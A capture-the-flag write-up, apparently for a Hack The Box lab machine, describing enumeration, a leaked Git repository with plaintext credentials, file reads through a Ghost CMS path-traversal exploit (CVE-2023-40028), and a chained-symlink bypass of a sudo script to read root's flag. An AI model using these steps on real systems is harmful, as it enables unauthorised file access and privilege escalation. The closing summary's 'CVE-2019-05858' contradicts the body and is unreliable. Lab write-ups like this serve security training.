# LinkVortex

```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
| :-- | :--- | :--- | :--- |
| 1 | `N/A` | **Nmap Scan & Subdomain Fuzzing** | Performed initial enumeration to discover open ports and subdomains. Found ports `22` (SSH) and `80` (HTTP) open, and identified the `dev.linkvortex.htb` subdomain. |
| 2 | `N/A` | **Git Leak Exploitation** | Discovered a Git repository leak on the `dev.linkvortex.htb` subdomain. Used **GitHack** to download the repository's contents. |
| 3 | `N/A` | **Information Gathering** | Analyzed the leaked files from the Git repository, which included a `config.production.json` file. This file contained credentials for the `Ghost CMS` administrative panel and for an email service. |
| 4 | `admin` | **CVE-2023-40028 Exploitation** | Logged into the `Ghost CMS` using the leaked credentials. Exploited **CVE-2023-40028**, a path traversal vulnerability, to read arbitrary files on the system, including the `/var/lib/ghost/config.production.json` file, which contained SSH credentials. |
| 5 | `bob` | **SSH Login** | Used the credentials from the configuration file (`bob`:`fibber-XXXXXXXXXXXXXX`) to log in via **SSH**, gaining access to the user shell and obtaining `user.txt`. |
| 6 | `root` | **Privilege Escalation via Sudo** | Found that user `bob` could run a script, `/opt/ghost/clean_symlink.sh`, with `sudo` and without a password. The script filtered symbolic link targets for "etc" or "root" but could be bypassed with a chained symbolic link. Exploited this vulnerability to read `/root/root.txt`, escalating privileges to root. |

## Nmap
```bash
[root@kali] /home/kali
❯ nmap -sSCV -Pn LinkVortex.htb

Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org) ) at 2024-12-08 21:44 CST
Nmap scan report for LinkVortex.htb (10.10.11.47)
Host is up (0.088s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
| http-title: BitByBit Hardware
|_Requested resource was [http://linkvortex.htb/](http://linkvortex.htb/)
| http-robots.txt: 4 disallowed entries
|_/ghost/ /p/ /email/ /r/
|_http-generator: Ghost 5.58
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report an incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 20.62 seconds
````

-----

## Subdomain Fuzz

```bash
[root@kali] /home/kali/LinkVortex
❯ ffuf -u [http://linkvortex.htb/](http://linkvortex.htb/) -w ./fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.linkvortex.htb"  -mc 200            ⏎
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/
       v2.1.0-dev
________________________________________________
 :: Method           : GET
 :: URL              : [http://linkvortex.htb/](http://linkvortex.htb/)
 :: Wordlist         : FUZZ: /home/kali/LinkVortex/fuzzDicts/subdomainDicts/main.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________
dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 73ms]
:: Progress: [167378/167378] :: Job [1/1] :: 500 req/sec :: Duration: :: Errors: 46 ::
```

Found: **dev.linkvortex.htb**, added to `/etc/hosts`.

-----

## Dirsearch

```bash
[root@kali] /home/kali/LinkVortex
❯ dirsearch -u linkvortex.htb -t 50 -i 200
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See [https://setuptools.pypa.io/en/latest/pkg_resources.html](https://setuptools.pypa.io/en/latest/pkg_resources.html)
  from pkg_resources import DistributionNotFound, VersionConflict
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460
Output File: /home/kali/LinkVortex/reports/_linkvortex.htb/_24-12-08_21-50-06.txt
Target: [http://linkvortex.htb/](http://linkvortex.htb/) Starting: 200 - 15KB - /favicon.ico 200 - 1KB - /LICENSE 200 - 103B  - /robots.txt 200 - 255B  - /sitemap.xml
```

Checking `/robots.txt`:

```
User-agent: *
Sitemap: [http://linkvortex.htb/sitemap.xml](http://linkvortex.htb/sitemap.xml)
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
```

The `/ghost/` route leads to a login page.

Perform a directory scan on **dev.linkvortex.htb**:

```bash
[root@kali] /home/kali/LinkVortex
❯ dirsearch -u dev.linkvortex.htb -t 50 -i 200
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See [https://setuptools.pypa.io/en/latest/pkg_resources.html](https://setuptools.pypa.io/en/latest/pkg_resources.html)
  from pkg_resources import DistributionNotFound, VersionConflict
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460
Output File: /home/kali/LinkVortex/reports/_dev.linkvortex.htb/_24-12-09_10-27-46.txt
Target: [http://dev.linkvortex.htb/](http://dev.linkvortex.htb/) Starting: 200 - 557B  - /.git/ 200 - 73B  - /.git/description 200 - 201B  - /.git/config 200 - 41B  - /.git/HEAD 200 - 620B  - /.git/hooks/ 200 - 402B  - /.git/info/ 200 - 240B  - /.git/info/exclude 200 - 401B  - /.git/logs/ 200 - 175B  - /.git/logs/HEAD 200 - 418B  - /.git/objects/ 200 - 393B  - /.git/refs/ 200 - 147B  - /.git/packed-refs 200 - 691KB - /.git/index
```

-----

## GitHack

There is a Git leak. Use the **GitHack** tool to pull it down.

```bash
[root@kali] /home/kali/LinkVortex/GitHack (master) ⚡
❯ python GitHack.py -u "[http://dev.linkvortex.htb/.git/](http://dev.linkvortex.htb/.git/)"
```

Some **password** keywords can be found within the leaked files. The first password found allows for a successful login.

  * **Username:** `admin@linkvortex.htb`
  * **Password:** `OctopiFociPilfer45`

Successfully entered the backend.

Using **Wappalyzer**, the current **Ghost CMS** version is **5.58**.

-----

## User

### CVE-2023-40028

Searching on Google reveals this exploit:
[github author="0xyassine" project="CVE-2023-40028"][/github]
This requires some modifications to the script.

```bash
[root@kali] /home/kali/LinkVortex/CVE-2023-40028 (master) ⚡
❯ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
Successfully read /etc/passwd
```

The **GitHack** also found a `Dockerfile` in the leak.

```bash
[root@kali] /home/kali/LinkVortex/GitHack/dev.linkvortex.htb (master) ⚡
❯ cat Dockerfile.ghost
FROM ghost:5.58.0
# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json
# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh
ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```

Trying to read the `/var/lib/ghost/config.production.json` configuration file:

```bash
[root@kali] /home/kali/LinkVortex/CVE-2023-40028 (master) ⚡
❯ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-XXXXXXXXXXXXXX"
        }
      }
    }
}
```

Obtained username and password:

  * **Username:** `bob@linkvortex.htb`
  * **Password:** `fibber-XXXXXXXXXXXXXX`
    SSH login to get `user.txt`.

-----

## Root

Check Bob's command permissions:

```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT
User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

View the `/opt/ghost/clean_symlink.sh` script:

```bash
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash
QUAR_DIR="/var/quarantined"
if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi
LINK=$1
if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi
if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

The script will:

  * Move the symbolic link to `/var/quarantined` if the file suffix is `.png` and it's a symbolic link.
  * The target path must **not** contain `etc` or `root`.
  * If `CHECK_CONTENT=true`, the script will print the contents of the file.

Bypass the script's checks using a chained symbolic link:

```bash
bob@linkvortex:~$ ln -s /root/root.txt z0n.txt
bob@linkvortex:~$ ln -s /home/bob/z0n.txt z0n.png
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/z0n.png
```

-----

## Summary

The user acquisition process involved standard **information collection**, **port** and **subdomain scanning**. A Git leak was discovered on a development environment, which the developer failed to shut down before deployment. **Ghost CMS** was not updated in a timely manner, exposing it to **CVE-2019-05858**, which allowed for arbitrary file reads. This vulnerability was exploited to obtain the SSH user's account and password from the configuration file.

Root access on this machine did not require an elevated privilege, but rather the exploitation of a specially privileged script to read arbitrary files. The `clean_symlink.sh` script only filters command-line parameters, but **symbolic links** can be chained to bypass this filter and directly access `root.txt`.